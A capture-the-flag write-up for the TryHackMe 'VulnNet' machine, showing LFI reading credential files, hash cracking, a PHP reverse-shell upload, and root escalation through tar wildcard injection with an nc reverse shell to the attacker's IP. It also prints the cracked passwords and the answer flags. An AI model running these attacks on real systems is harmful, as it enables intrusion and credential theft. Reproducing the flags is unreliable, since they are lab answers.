# VulnNet

Can you take advantage of the misconfigurations made by VulnNet Entertainment?

The purpose of this challenge is to make use of more realistic techniques and include them into a single machine to practice your skills.

* Difficulty: Medium
* Web Language: PHP

This machine was initially posted on other platforms under the name Shuriken. Now I made it available on TryHackMe with a different name (for a reason) and a bit modified privilege escalation (also for a reason).

﻿﻿You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts

# What is the user flag? (user.txt)

## Initial foothold

As instructed, let's add the IP with the domain to our `/etc/hosts` file:

~~~
$ echo "10.10.123.41 vulnnet.thm" | sudo tee -a /etc/hosts
~~~

A Nmap scan reveals 2 ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web

There is no `robots.txt` file and gobuster doesn't find anything useful.

Checking the source code of the main page reveals 2 javascript imports at the end of the code:

~~~
<script src="/js/index__7ed54732.js"></script>
<script src="/js/index__d8338055.js"></script>
~~~

The analysis of the first script will reveal the following subdomain:

~~~
return "".concat(void 0 === e ? "http://broadcast.vulnnet.thm" : e).concat("/", "?_alias=").concat(n, "&_callbackAlias=").concat(l, "&_lang=").concat(c)
~~~

The second script reveals that `index.php` accepts a `referer` parameter:

~~~
}, n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0)
~~~

Let's add `broadcast.vulnnet.thm` to our hosts file:

~~~
$ echo "10.10.123.41 broadcast.vulnnet.thm" | sudo tee -a /etc/hosts
~~~

Browsing this new subdomain prompts for a basic authentication, which is a dead end at this stage. Let's check the other information.

## LFI

Injecting `/etc/password` as `referer` confirms that the page suffers from a Local File Inclusion (LFI):

~~~
┌──(kali㉿kali)-[/data/VulnNet]
└─$ curl -s http://vulnnet.thm/?referer=/etc/passwd 

[REDACTED]

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
  <script src="/js/index__7ed54732.js"></script>
  <script src="/js/index__d8338055.js"></script>

</body>
</html>
~~~

As we have seen previously, the other domain is protected by a basic authentication. Let's check in the Apache configuration files what we can find:

~~~
┌──(kali㉿kali)-[/data/VulnNet]
└─$ curl -s http://vulnnet.thm/?referer=/etc/apache2/sites-enabled/000-default.conf

[REDACTED]

<VirtualHost *:80>
  ServerAdmin webmaster@localhost
  ServerName vulnnet.thm
  DocumentRoot /var/www/main
  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined
  <Directory /var/www/main>
    Order allow,deny
    allow from all
  </Directory>
</VirtualHost>

<VirtualHost *:80>
  ServerAdmin webmaster@localhost
  ServerName broadcast.vulnnet.thm
  DocumentRoot /var/www/html
  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined
  <Directory /var/www/html>
    Order allow,deny
    allow from all
    AuthType Basic
    AuthName "Restricted Content"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
  </Directory>
</VirtualHost>

[REDACTED]
~~~

## Break the broadcast.vulnnet.thm authentication

It looks like the basic authentication password file is stored in `/etc/apache2/.htpasswd`. Let's get the content of the file:

~~~                                                                                                                    
┌──(kali㉿kali)-[/data/VulnNet]
└─$ curl -s http://vulnnet.thm/?referer=/etc/apache2/.htpasswd                     

[REDACTED]

developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0

[REDACTED]
~~~

Save this hash and crack it with John:

~~~
┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ /data/src/john/run/john auth.hash --wordlist=/usr/share/wordlists/rockyou.txt  
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (developers)
1g 0:00:00:13 DONE (2021-05-07 07:32) 0.07262g/s 156946p/s 156946c/s 156946C/s 9982..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

We now have the credentials (`developers:9972761drmfsls`) to authenticate against the subdomain.

## The broadcast.vulnnet.thm website

We can now go to http://broadcast.vulnnet.thm and use the credentials (`developers:9972761drmfsls`).

The title of the page shows `ClipBucket v4.0`, an Open Source OTT, VOD and Enterprise Video Hosting Solution. Using `searchsploit`, we can identify a critical vulnerability:

~~~
┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ searchsploit clipbucket 4.0
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injectio | php/webapps/44250.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

## Reverse shell

Following the instructions in the exploit, we can upload a php reverse shell to the target:

~~~
┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ curl -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
creating file{"success":"yes","file_name":"1620367741f6065c","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
~~~

Open a listener (`nc -nlvp 4444`) and browse the uploaded shell (`http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1620367741f6065c.php`). We now have a reverse shell:

~~~
┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ nc -nlvp 4444       
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.93.62] 60288
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:17:02 up  1:01,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

## Lateral move (www-data -> server-management)

Checking the `/home` folder, as well as the `/etc/passwd` file will confirm the existence of a `server-management` user. Let's check what files are owned by this user:

~~~
www-data@vulnnet:/home$ find / -type f -user server-management -exec ls -l {} + 2>/dev/null
<user server-management -exec ls -l {} + 2>/dev/null
-rw-rw-r-- 1 server-management server-management 1484 Jan 24 14:08 /var/backups/ssh-backup.tar.gz
~~~

Let's download the `/var/backups/ssh-backup.tar.gz` archive and uncompress the archive. It will result in a password-protected SSH private key. Let's crack it:

~~~
┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ /data/src/john/run/ssh2john.py id_rsa > ssh.hash

┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ /data/src/john/run/john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
oneTWO3gOyac     (id_rsa)
1g 0:00:00:05 DONE (2021-05-07 08:44) 0.1669g/s 2394Kp/s 2394Kc/s 2394KC/sa6_123..*7¡Vamos!
Session completed
~~~

John successfully cracked the password (`oneTWO3gOyac`).

## User flag

We can now connect and get the user flag:

~~~
┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ ssh -i id_rsa server-management@vulnnet.thm                                 
Enter passphrase for key 'id_rsa': oneTWO3gOyac
server-management@vulnnet:~$ cat user.txt 
THM{907e420d979d8e2992f3d7e16bee1e8b}
~~~

User flag: `THM{907e420d979d8e2992f3d7e16bee1e8b}`

# What is the root flag? (root.txt)

## Cronjob

There is a cronjob (`/var/opt/backupsrv.sh`) run by `root` every 2 minutes:

~~~
server-management@vulnnet:/tmp$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/2   * * * *	root	/var/opt/backupsrv.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
~~~

## Reverse shell

We don't have write access to the script.

~~~
server-management@vulnnet:/tmp$ cd /var/opt/
server-management@vulnnet:/var/opt$ ll
total 12
drwxr-xr-x  2 root root 4096 Jan 23 21:30 ./
drwxr-xr-x 14 root root 4096 Jan 23 14:20 ../
-rwxr--r--  1 root root  530 Jan 23 21:30 backupsrv.sh*
~~~

Let's check what the script does:

~~~
server-management@vulnnet:/var/opt$ cat backupsrv.sh 
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
~~~

The script is backing up our `Documents` folder using `tar` to compress the archive.

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) what we can do with `tar` confirms that we can exploit it by creating 2 files which names will be interpreted as options passed to the `tar` command.

~~~
server-management@vulnnet:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 4444 >/tmp/f" > /home/server-management/Documents/rev.sh
server-management@vulnnet:/tmp$ touch "/home/server-management/Documents/--checkpoint=1"
server-management@vulnnet:/tmp$ touch "/home/server-management/Documents/--checkpoint-action=exec=sh rev.sh"
~~~

## Root flag

Start a listener (`nc -nlvp 4444`) and wait 2 min to get a root shell.

~~~
┌──(kali㉿kali)-[/data/VulnNet/files]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.141.227] 54082
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
THM{220b671dd8adc301b34c2738ee8295ba}
~~~

Root flag: `THM{220b671dd8adc301b34c2738ee8295ba}`
